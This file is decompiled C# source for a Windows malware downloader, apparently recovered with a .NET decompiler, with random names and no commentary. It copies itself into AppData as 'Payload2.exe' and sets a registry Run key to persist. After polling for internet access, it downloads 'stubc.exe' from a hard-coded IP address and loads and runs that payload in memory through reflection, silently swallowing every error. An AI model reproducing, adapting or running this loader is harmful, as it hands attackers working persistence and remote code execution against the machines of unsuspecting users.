using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;
using Microsoft.Win32;

namespace habcrkxbjubufocjyh
{
	// Token: 0x02000002 RID: 2
	internal static class ynewpuqnwmfb
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		public static void Main()
		{
			ynewpuqnwmfb.InstallPayload();
			while (!ynewpuqnwmfb.Intrnet())
			{
				Thread.Sleep(5000);
			}
			foreach (string text in ynewpuqnwmfb.ListURLS.ToArray())
			{
				try
				{
					ynewpuqnwmfb.FetchFiles(text);
					Thread.Sleep(2500);
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000002 RID: 2 RVA: 0x000020B8 File Offset: 0x000002B8
		private static bool Intrnet()
		{
			WebRequest webRequest = WebRequest.Create("https://www.bing.com/");
			bool flag;
			try
			{
				webRequest.GetResponse();
				flag = true;
			}
			catch
			{
				flag = false;
			}
			return flag;
		}

		// Token: 0x06000003 RID: 3 RVA: 0x000020F4 File Offset: 0x000002F4
		private static void InstallPayload()
		{
			try
			{
				string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Payload2.exe");
				if (!(Process.GetCurrentProcess().MainModule.FileName == text))
				{
					FileStream fileStream;
					if (File.Exists(text))
					{
						fileStream = new FileStream(text, FileMode.Create);
					}
					else
					{
						fileStream = new FileStream(text, FileMode.CreateNew);
					}
					byte[] array = File.ReadAllBytes(Process.GetCurrentProcess().MainModule.FileName);
					fileStream.Write(array, 0, array.Length);
					fileStream.Dispose();
					Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\").SetValue(Path.GetFileName(text), text);
					Process.Start(text);
					Thread.Sleep(50);
					Environment.Exit(0);
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000004 RID: 4 RVA: 0x000021B4 File Offset: 0x000003B4
		private static void FetchFiles(string url)
		{
			using (WebClient webClient = new WebClient())
			{
				try
				{
					byte[] array = webClient.DownloadData(url);
					Thread thread = new Thread(new ParameterizedThreadStart(ynewpuqnwmfb.Execute));
					thread.Start(array);
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000005 RID: 5 RVA: 0x00002218 File Offset: 0x00000418
		private static void Execute(object Payload)
		{
			try
			{
				Assembly assembly = AppDomain.CurrentDomain.Load((byte[])Payload);
				MethodInfo methodInfo = ynewpuqnwmfb.Entry(assembly);
				object obj = assembly.CreateInstance(methodInfo.Name);
				object[] array = new object[1];
				if (methodInfo.GetParameters().Length == 0)
				{
					array = null;
				}
				ynewpuqnwmfb.MethodInfo(methodInfo, obj, array);
			}
			catch
			{
			}
		}

		// Token: 0x06000006 RID: 6 RVA: 0x0000227C File Offset: 0x0000047C
		private static object MethodInfo(MethodInfo meth, object obj1, object[] obj2)
		{
			if (meth != null)
			{
				return meth.Invoke(obj1, obj2);
			}
			return false;
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002296 File Offset: 0x00000496
		private static MethodInfo Entry(Assembly obj)
		{
			if (obj != null)
			{
				return obj.EntryPoint;
			}
			return null;
		}

		// Token: 0x04000001 RID: 1
		private static List<string> ListURLS = new List<string>(new string[] { "http://104.254.245.82/stubc.exe" });
	}
}
